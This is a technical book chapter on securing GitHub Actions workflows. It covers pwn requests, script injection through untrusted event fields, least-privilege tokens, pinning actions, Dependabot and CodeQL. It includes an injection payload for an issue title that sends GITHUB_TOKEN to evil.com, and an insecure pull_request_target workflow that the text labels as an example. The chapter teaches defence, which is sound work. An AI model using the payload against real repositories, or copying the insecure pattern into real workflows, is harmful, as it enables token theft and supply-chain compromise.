# Security

This chapter covers

* Writing secure action workflows
* Securing the actions used in workflows
* Adding supply chain security
* Enabling Dependabot for dependency scanning
* Enabling code scanning with CodeQL

This chapter shares best practices to ensure you use actions and workflows in a safe and secure way. In the chapter, we will describe problems commonly encountered when using actions as well as how you can deal with them. We start this chapter with some basic security bugs you need to be aware of and how your team or organization can avoid them. The second part of the chapter covers how to ensure you are doing all you can to deliver software that is secure as a result of the automation process.

## 10.1 Preventing pwn requests

GitHub workflows can be activated by a diverse range of repository events, which encompass those tied to incoming pull requests (PRs). A potential hazard lies in the misuse of the `pull_request_target` workflow trigger, as it can allow malicious PR authors (i.e., attackers) to gain access to repository write permissions or steal repository secrets. This type of attack is known as a *pwn request*.

Automated handling of PRs from external forks carries inherent risk. Such PRs should be treated as untrusted inputs. Dealing with untrusted PRs, this automated behavior can leave your repository vulnerable to exploitation if not handled cautiously.

Attackers can potentially execute arbitrary code within a workflow runner dealing with a malicious PR in various ways. They might inject malicious changes into existing build scripts, such as makefiles or PowerShell files, or redefine the build script in the package.json file. They can insert their payload as a new test to be run alongside others, achieving code execution before the actual build occurs. For example, `npm` packages may have custom preinstall and postinstall scripts, so running `npm-install` could trigger malicious code if attackers added a new package reference. This is why it’s crucial to never check out and build PRs from untrusted sources without thoroughly inspecting the PR’s code.

Due to the risks associated with the automated processing of PRs, GitHub’s standard `pull_request` workflow trigger, by default, restricts write permissions and access to secrets in the target repository. However, in some scenarios, extended access is necessary to handle the PR effectively, which led to the introduction of the `pull_request_target` workflow trigger.

The key differences between the two triggers are:

* Workflows triggered by `pull_request_target` have write permissions to the target repository and access to target repository secrets. The same holds for workflows triggered by pull_request from a branch in the same repository but not from external forks. This is based on the assumption that it’s safe to share repository secrets if the PR creator already has write permission to the target repository.

* `pull_request_target` operates within the context of the target repository of the PR rather than the merge commit. Consequently, the standard checkout action uses the target repository to prevent inadvertent use of user-supplied code.

The `pull_request_target` trigger is intended for PRs that don’t require risky processing, such as building or running the PR content. It is best used to manage administrative tasks, like updating the PR with annotations or labels.

Listing 10.1 provides an example of the insecure handling of an incoming PR. Because the workflow runs build and custom actions based on the code from the PR, there’s a risk of malicious scripts or actions being injected into the build process. This could compromise the build environment or even the production environment, depending on what the CI/CD pipeline is set up to do. Also, by passing secrets (like `secrets.supersecret`) to actions or scripts that are executed based on the PR’s code, you’re potentially exposing those secrets to untrusted code. If the forked repository has malicious code, it could capture and exfiltrate those secrets.

**Listing 10.1 Insecure handling of incoming PR**

```yml
# INSECURE. This is provided as an example only.
on:
  pull_request_target:
    types:
      - opened
      - synchronize
  
jobs:
  build:
    name: Build and test
    runs-on: ubuntu-latest
    steps:
    - name: Checkout Repository
      uses: actions/checkout@v2
      with:
        ref: ${{ github.event.pull_request.head.sha }}
        repository: vriesmarcel/actions-in-actions
  
    - name: Setup Node.js
      uses: actions/setup-node@v1
  
    - name: Install Dependencies and Build
      run: |
        npm install
        npm run build
  
    - name: Run Your Custom Action
      uses: vriesmarcel/your-custom-action # Replace this with the actual action you want to use.
      with:
        arg1: ${{ secrets.supersecret }}
  
    - name: Comment on PR
      uses: vriesmarcel/comment-on-pr-action # Replace this with the actual action you want to use.
      with:
        message: |
          Thank you!
```

Listings 10.2 and 10.3 show the intended usage in which a low-privileged `pull_request` workflow results are integrated with a high-privileged workflow to leave a comment in response to a received PR.

**Listing 10.2 Handling incoming PR with low privilege**

```yml
name: Receive PR
# Read-only repo token
# No access to secrets
on:
  pull_request:
    types:
      - opened
      - synchronize
jobs:
  build:
    runs-on: ubuntu-latest
  
    steps:        
      - name: Checkout Repository
        uses: actions/checkout@v2
  
      # Imitation of a build process
      - name: Build
        run: /bin/bash ./build.sh
  
      - name: Save PR number
        run: |
          mkdir -p ./pr
          echo ${{ github.event.number }} > ./pr/NR
      - name: Upload PR Artifact
        uses: actions/upload-artifact@v2
        with:
          name: pr
          path: pr/
```

Here, we handle the incoming PR with the lower privileged event because the code coming in is not trusted. This workflow now has no access to any secrets and prevents us from executing anything malicious that might be part of the PR. We then create a new PR that can be used as a trigger to do the follow-up work under a higher privilege.

**Listing 10.3 Handle follow-up of PR with high privilege**

```yml
name: Comment on the pull request
# Read–write repo token
# Access to secrets
on:
  workflow_run:
    workflows: ["Receive PR"]
    types:
      - completed
  
jobs:
  upload:
    runs-on: ubuntu-latest
    if: >
      github.event.workflow_run.event == 'pull_request' &&
      github.event.workflow_run.conclusion == 'success'
  
    steps:
      - name: Download Artifact
      - uses: actions/download-artifact@v3
        with:
          name: pr
      
      - name: unzip artifact
        run: unzip pr.zip
  
      - name: Comment on PR
        uses: actions/github-script@v3
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            var fs = require('fs');
            var issue_number = Number(fs.readFileSync('./pr/NR'));
            await github.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: issue_number,
              body: 'Everything is OK. Thank you for the PR!'
            });
```

In the second workflow, we do the more privileged work that works on trusted sources. By splitting the workflows into two parts you are safeguarded from any malicious code that might be triggered as part of the PR. You can now safely do more privileged operations in the second follow-up workflow, since that only uses trusted sources.

Simply put, *be very careful* when using `pull_request_target`, and only use it when you need the privileged context of the target repo available in your workflow, especially when combined with explicit handling of the contents of a PR coming from an untrusted source.

## 10.2 Managing untrusted input

In this section, we will dive into how people can misuse a workflow that, at first sight, seems perfectly safe. This has to do with the processing of input that should not be trusted.

A wide array of events can initiate GitHub Actions workflows. Each workflow trigger is accompanied by a GitHub context that provides essential information about the event responsible for the trigger, including the user who initiated it, the branch name, and other relevant event context particulars. Some of the event data, such as the base repository name, changeset hash values, or PR numbers, are typically beyond the control of the user initiating the event (e.g., in the case of a PR).

But you need to be very careful about data getting into the hands of the user and potentially your attacker! These data points must be regarded as potentially untrusted inputs and treated cautiously. The following data points must be treated as untrusted:

* github.event.issue.title
* github.event.issue.body
* github.event.pull_request.title
* github.event.pull_request.body
* github.event.comment.body
* github.event.review.body
* github.event.pages.*.page_name
* github.event.commits.*.message
* github.event.head_commit.message
* github.event.head_commit.author.email
* github.event.head_commit.author.name
* github.event.commits.*.author.email
* github.event.commits.*.author.name
* github.event.pull_request.head.ref
* github.event.pull_request.head.label
* github.event.pull_request.head.repo.default_branch
* github.head_ref  

A malicious user can use these inputs to inject syntax that can result in the exploitation of your workflow. To give you a simple example, consider the following part of a workflow:

```yml
- run: echo "${{ github.event.issue.title }}"
```

Now, consider a user putting the following text in the title of the issue:

```yml
a"; set +e; curl http://evil.com?token=$GITHUB_TOKEN;#
```

This can result in your workflow handing over the `GITHUB_TOKEN` that has write rights in the repo to a location on the web: evil.com. The token is valid for the duration of the workflow, and the `curl` command can be kept waiting for at least 30 seconds. That provides an attacker a window of attack to run GitHub commands using the token and push, for example, an update to your package configuration of the application and make it appear as a normal commit. This can result in a malicious package in your packaging chain that you won’t notice.

Context expressions are, by definition, dangerous when they use input from the aforementioned data points, controlled by users. The recommended approach for mitigating code and command injection vulnerabilities in GitHub workflows involves storing untrusted input as an intermediate environment variable. Here’s how you can implement this best practice:

```yml
- name: Print Title
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
```

This method involves capturing the value of `${{ github.event.issue.title }}` in a dedicated environment variable (`TITLE`). By doing so, the value is isolated in memory and used as a variable, rather than directly affecting the script generation. It is also a full string and, thus, will not be interpolated.

To detect and prevent the early usage of potentially harmful patterns in the development lifecycle, the GitHub Security Lab has created CodeQL queries that repository owners can seamlessly integrate into their CI/CD pipelines. In section 10.4.2, we will go into more detail on the use of CodeQL as a means to detect multiple issues not only in our workflows but also in used actions and even your own written source code.

You can also create an action workflow that contains an action called `actionlint` (see section 3.9). This action is a linter for your action workflows and will warn you when it finds these kinds of vulnerabilities toward shell injection attacks as described. The following listing shows what this workflow looks like, which can warn you of potential issues in your workflow.

**Listing 10.4 Action linting workflow to prevent known vulnerabilities**

```yml
on:
  pullrequest: 
jobs:
  run-actionlint:
    runs-on: ubuntu-latest
    permissions:
      # Needed for the checkout action
      contents: read
      # Needed to annotate the files in a pull request with comments
      pull-requests: write
    steps: 
    # Checkout the source code to analyze.
    - uses: actions/checkout@v3 
    # Runs the actionlinter, which will fail on errors
    - uses: devops-actions/actionlint@c0ee017f8abef55d843a647cd737b87a1976eb69
```

This workflow will fail when the `actionlint` action finds you have exposed yourself to vulnerabilities, like shell injection attacks in your action’s workflow. The details of the run show the exact issues it has found. Figure 10.1 shows the results of running this on our companion repository. As you can see, the linter even goes one step deeper, warning of potential issues when you have not used quotes in your scripts that can expose you to a word-splitting issue.

#### Word splitting

In shell programming, word splitting is the process of breaking up a string into separate words or arguments based on whitespace or other delimiters. When a variable is unquoted, the shell performs word splitting on its value, which means it splits the value into separate words based on whitespace and then treats each word as a separate argument. This can cause problems when the variable contains spaces or other special characters. You can quote the variable to prevent word splitting and avoid this.

If you use unquoted variables in your workflow, it can lead to unexpected behavior and security problems. For example, if you use an unquoted variable that contains a malicious command, the shell will execute that command when the variable is expanded. Alternatively, you can disable `shellcheck` for the next statement by adding `# shellcheck disable=SC2046` to indicate that you reviewed the operation as conforming to the intent.

## 10.3 GitHub Actions security

By now, you know that GitHub Actions provides a swift and convenient way to create automated workflows using prebuilt components—actions developed by other contributors. The GitHub Marketplace provides many free actions that you can incorporate into your workflows. When you employ the uses directive to reference an action, you’re essentially running third-party code and granting it access to the following:

* Computing resources
* Secrets used within the same workflow job
* Your repository token

It’s important to know that malicious actors can take advantage of the computing resources and take potentially harmful actions or compromise secret information in your repos. This affects costs and can affect you, as the repository owner, because GitHub limits the number of parallel jobs that can run in a single repository. Consequently, a compromised or malicious action could disrupt your repository’s automated workflows.

When granting read access to secrets, such as deployment keys, they can be exploited by malicious actors for lateral movement, enabling them to compromise additional resources. While only the secrets explicitly referenced or used within the workflow job are potentially accessible to the action, the repository token behaves differently. Even if the `GITHUB_TOKEN` isn’t explicitly employed in a workflow, it remains accessible to all referenced actions.

It’s reasonable to assume that anyone who manages the YAML action definition has access to the temporary repository token within the context of the executing workflow that consumes the action. Therefore, it’s crucial to meticulously review the permissions you grant to the workflows you run and follow the principle of least privileged.

### 10.3.1 The principle of least privileged

The *principle of least privilege* (PoLP) is a security concept that limits the access of users or entities to the minimum level needed to perform their tasks. This concept extends to the permissions associated with secrets used in your workflows and the automatically provided temporary repository token, which is determined by the type of workflow trigger.

For instance, when a secret is designed to enable file uploads to a specific cloud storage service, it should be configured to grant only the essential write permissions, while denying read and delete access. Maintaining distinct tokens for distinct usage scenarios is advisable rather than relying on a single universal token.

The permissions associated with the automatically provided `GITHUB_TOKEN` for the repository are limited in the context of a PR originating from a fork. However, they are more permissive in other scenarios, such as when a new issue or a comment initiates a workflow. GitHub’s recommended security practice involves reducing the permissions of the `GITHUB_TOKEN` to the bare minimum necessary for your workflow to function effectively. For added safety, it is good practice to check the defaults and consider altering the default permissions for your organization if they are set to *read* and *write*. It is best to set the default to *read-only*. This has become the default for new organizations since the summer of 2023, when it was changed from *read* and *write*. You can grant additional permissions to specific workflows on a case-by-case basis, as needed. This is done by specifying the required permissions at either the workflow or job level as well as the scope of the permissions. The best practice is using `read:all` on the workflow level and then adding extra permissions on the job level if needed. This makes things explicit, instead of hoping a sensible default was set on the organization or repository level. This is shown in the following listing, where we explicitly grant permission to `pull_request: write`, so we can set the comments on the PR using the script.

**Listing 10.5 Elevating privileges for a specific scope**

```yml
name: Comment on the PR
permissions:
  read: all
on:
  workflow_run:
    workflows: ["Receive PR"]
    types:
      - completed
  
jobs:
  upload:
    runs-on: ubuntu-latest
    if: >
      github.event.workflow_run.event == 'pull_request' &&
      github.event.workflow_run.conclusion == 'success'
    
    permissions:
      pull-requests: write
    
  
    steps:
      - name: Download Artifact
      - uses: actions/download-artifact@v3
        with:
          name: pr
      
      - name: unzip artifact
        run: unzip pr.zip
  
      - name: Comment on PR
        uses: actions/github-script@v3
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            var fs = require('fs');
            var issue_number = Number(fs.readFileSync('./pr/NR'));
            await github.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: issue_number,
              body: 'Everything is OK. Thank you for the PR!'
            });
```

Note that if access to any scope is specified, all unspecified scopes, like contents, PRs, or actions, are set to none.

### 10.3.2 Referencing actions

Using a new action in your workflow demands careful consideration of its security implications. Some actions come with a Verified Creator badge, which can provide a degree of assurance regarding the action’s trustworthiness. *Verified creator* refers to the organization that published the action having been verified. This verification is primarily based on the validation of the ownership of the domain and the published claims for his organization. This is done based on putting a special text record in DNS, so it can be verified. The fact that a published claim is verified does not imply that what they published is safe or has no known vulnerabilities. It only provides some confidence that the publisher’s domain is verified and that the publisher has configured two-factor authentication for the organization; hence, the origin is better known. Figure 10.2 shows the verification badge you will see when a marketplace action is from a verified publisher. The best practice is always to conduct a thorough code audit, much like you would for open source libraries, to assess its security and ensure it doesn’t engage in suspicious activities, such as transmitting secrets to external hosts.

![](https://learning.oreilly.com/api/v2/epubs/urn:orm:book:9781633437302/files/OEBPS/Images/CH10_F02_Kaufmann.png)<br>
**Figure 10.2 Action from a verified creator**

Once you’ve verified the action’s code, there are several ways to reference it in your workflow:

* *By branch name*—For example, `uses: owner/action-name@main` always uses the latest version from the main branch. While this grants full trust to the action’s creator, it is susceptible to potential breaking changes in future versions.

* *By tag/release*—Using a specific tag or release, like `uses: owner/action-name@v1`, safeguards against unintentional changes but remains susceptible to intentional modifications. Later, the tag can be altered to point to a different changeset if necessary.

* *By full changeset hash reference*—Using the full changeset hash, like `uses: owner/action-name@26968a09c0ea4f3e233fdddbafd1166051a095f6`, is currently the most secure way to reference a specific snapshot of an action.

* *Forking the action*—Depending on your requirements, you can fork the action and reference the fork in your workflows. You may need to configure vetted updates from the original repository to ensure potential security fixes are incorporated.

Each option represents a tradeoff between ensuring the integrity of the supply chain and automatically patching vulnerabilities in dependencies. With all options except the last, you can configure Dependabot to create a PR when the action is updated. To protect repository secrets, these PRs are treated as if they come from external forks. However, accepting changes without review is not the most secure approach. It is recommended to verify what changes have occurred in the action source code every time it’s updated.

It is good to note that you might want to be more cautious about referencing actions when you use self-hosted runners. Self-hosted runners are often used to provide access to locations in your network that are impossible to access with hosted runners. The moment an attacker can inject anything in an action you use, you are then running this injected code in your carefully shielded environment. It is a very important vector of attack that you must be aware of. When using self-hosted runners, it is advisable to always fork the actions you want to use and enforce that all actions must come from the organization you set up to host all the forks.

You can even improve the experience by providing the setup of a private marketplace with CodeQL and Dependabot scanning on all those forks, so you can get early warnings that a new vulnerability is found that can affect your organization. Setting up such a private marketplace is beyond the scope of this book, but you can learn more about the topic by reading “[Setup an Internal GitHub Actions Marketplace][1]” by Rob Bos.

## 10.4 Supply chain security

When building software, you take many dependencies on other people’s software. This is often done in the form of a package. Packages are a way to manage these dependencies; using packages is a well-known approach in the industry, and various programming environments have different package-management solutions—think of, for example, npm, NuGet, Maven, or ruby gems. Most package-management systems also support dependencies on other packages, creating a dependency graph.

Relying on a package that harbors a security vulnerability can lead to many problems for your project and its users. It is, therefore, crucial to swiftly detect such a problem and replace the package with a secure version of the package. To detect these vulnerabilities in packages used in your sources, you can use a built-in capability of GitHub, called Dependabot. Dependabot can do the following for your repository:

* Detect dependencies with known vulnerabilities
* Detect newer versions of packages
* Create a PR to fix a known vulnerability

The moment you enable Dependabot, it will identify security vulnerabilities and malware in public repositories and present the dependency graph. On public repositories, this is available for free. For private repositories, you will need GitHub Enterprise and an Advanced Security license.

The security alerts are in the Security tab in the GitHub repository. Sometimes, it also shows a link to a generated PR, when it knows a new, nonvulnerable version has been published. These PRs can then be accepted to correct the problem immediately.

### 10.4.1 Dependabot version updates for actions

Actions are frequently enhanced with bug fixes and new features to improve automated processes’ reliability, speed, and security. When you activate Dependabot version updates for GitHub Actions, Dependabot ensures that references to actions within a repository’s workflow.yml file and any reusable workflows employed within workflows are kept current by proposing a PR with the newer version.

Dependabot scrutinizes the reference used (typically a version number or commit identifier associated with the action) against the most recent version available for each action within the file. Should a more recent version of the action be available, Dependabot will generate a PR to update the reference within the workflow file to the latest version. You can tailor Dependabot version updates to oversee the maintenance of your actions, libraries, and dependent packages.

Here’s how you can set up Dependabot version updates:

1. If you previously enabled Dependabot version updates for other ecosystems or package managers, you can directly access and edit the dependabot.yml file.

2. If you haven’t configured Dependabot version updates before, start by creating a dependabot.yml configuration file. Place this file in the .github directory within your repository.

3. Specify github-actions as the package-ecosystem to monitor.

4. Set the directory to / to inspect workflow files located in .github/workflows.

5. Define a schedule interval to determine how frequently Dependabot should check for new versions.

6. Once you’ve made these configurations, commit the dependabot.yml configuration file into your repository’s .github directory. If you’ve modified an existing file, don’t forget to save your changes.

The following listing shows the contents of the dependabot.yml file to scan your action workflows. You can find further details about the Dependabot syntax used in the YAML file on GitHub’s website: https://mng.bz/5OZO.

Listing 10.6 Dependabot YAML file

```yml
version: 2
updates:
  
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      # Checks for updates to GitHub Actions every week
      interval: "weekly"
```

Figure 10.3 provides an example of setting Dependabot according to these settings. As you can see, it generates a list of PRs to fix the actions it knows have been updated. This way, you keep everything up to date all the time.

**Figure 10.3 PRs from Dependabot for actions**

### 10.4.2 Code scanning actions

GitHub has the option to use CodeQL as the way to scan all the source code in your repository for known vulnerabilities. When you enable CodeQL analysis, you get the dialog shown in figure 10.4 to configure the default setup.

![](https://learning.oreilly.com/api/v2/epubs/urn:orm:book:9781633437302/files/OEBPS/Images/CH10_F04_Kaufmann.png)<br>
**Figure 10.4 Scanning defaults**

In the event of any analysis failures, the respective language will be deselected automatically from the code scanning configuration. Alerts generated from successfully analyzed languages will be presented on GitHub. After enabling the CodeQL default setup, your actions are also scanned. The moment you create a vulnerability, as discussed in the previous paragraphs, this will be detected and reported. Figure 10.5 shows the warning generated when you have a script injection vulnerability in an action workflow.

![](https://learning.oreilly.com/api/v2/epubs/urn:orm:book:9781633437302/files/OEBPS/Images/CH10_F05_Kaufmann.png)<br>
**Figure 10.5 Scan results showing a script injection vulnerability warning**

## Summary

* Be careful of PRs coming in and running a workflow with too high of a privilege. Split the workflow into low- and high-privileged execution, where the latter only operates on trusted sources, not on the incoming code of the PR.

* Apply special attention to action security when you have private runners. Private runners are the ultimate way to open your network to be exploited!

* Be aware of the expression injection technique, and validate your workflows with a linting workflow that can warn you of such vulnerabilities.

* Always apply the principle of least privilege to ensure you don’t give actions more privileges than required.

* Apply dependency scanning to detect vulnerabilities in actions you use.

* Apply code scanning to help detect when you have made mistakes in your workflows, and then report them back in the security hub in the GitHub portal.

* The most secure route for your actions is using an organization containing all forks of the actions you want to use and adding a private marketplace for discoverability.
